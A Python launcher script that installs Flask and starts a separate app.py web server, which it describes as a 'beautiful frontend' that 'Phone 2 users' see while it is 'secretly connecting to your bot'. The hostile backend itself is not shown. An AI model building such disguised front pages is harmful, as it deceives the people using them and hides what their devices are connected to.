#!/usr/bin/env python3
"""
Start the Beautiful Frontend App
This will start the web app that Phone 2 users will see
"""

import subprocess
import sys
import os

def install_flask():
    """Install Flask if not already installed"""
    try:
        import flask
        print("✅ Flask already installed")
        return True
    except ImportError:
        print("📦 Installing Flask...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
            print("✅ Flask installed successfully!")
            return True
        except:
            print("❌ Failed to install Flask")
            return False

def start_app():
    """Start the web app"""
    print("🚀 Starting Beautiful Frontend App...")
    
    # Find the app script
    current_dir = os.getcwd()
    app_script = os.path.join(current_dir, "app.py")
    
    if not os.path.exists(app_script):
        print("❌ app.py not found!")
        print("   Make sure all files are in the same folder")
        return False
    
    try:
        # Start the web app
        process = subprocess.Popen(
            [sys.executable, app_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait a moment to see if it starts
        import time
        time.sleep(3)
        
        if process.poll() is None:  # Still running
            print("✅ Beautiful Frontend App started successfully!")
            print("🌐 Web interface available at: http://localhost:5000")
            print("\n📱 Phone 2 users will see a beautiful page")
            print("🤫 While secretly connecting to your bot!")
            print("\n🔄 App will keep running until you stop it (Ctrl+C)")
            
            # Keep the main process alive
            try:
                process.wait()
            except KeyboardInterrupt:
                print("\n🛑 Stopping app...")
                process.terminate()
                process.wait()
                print("✅ App stopped")
            
            return True
        else:
            stdout, stderr = process.communicate()
            print("❌ Failed to start app")
            if stderr:
                print(f"Error: {stderr.decode()}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def main():
    print("🎭 BEAUTIFUL FRONTEND + SECRET BACKEND")
    print("=" * 50)
    
    # Install Flask
    if not install_flask():
        print("❌ Cannot continue without Flask")
        input("Press Enter to exit...")
        return
    
    print("\n" + "=" * 50)
    
    # Start the app
    if start_app():
        print("\n🎉 Beautiful frontend is now running!")
        print("📱 Phone 2 users will see a beautiful page!")
        print("🤫 While secretly connecting to your bot!")
    else:
        print("\n❌ Failed to start app")
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
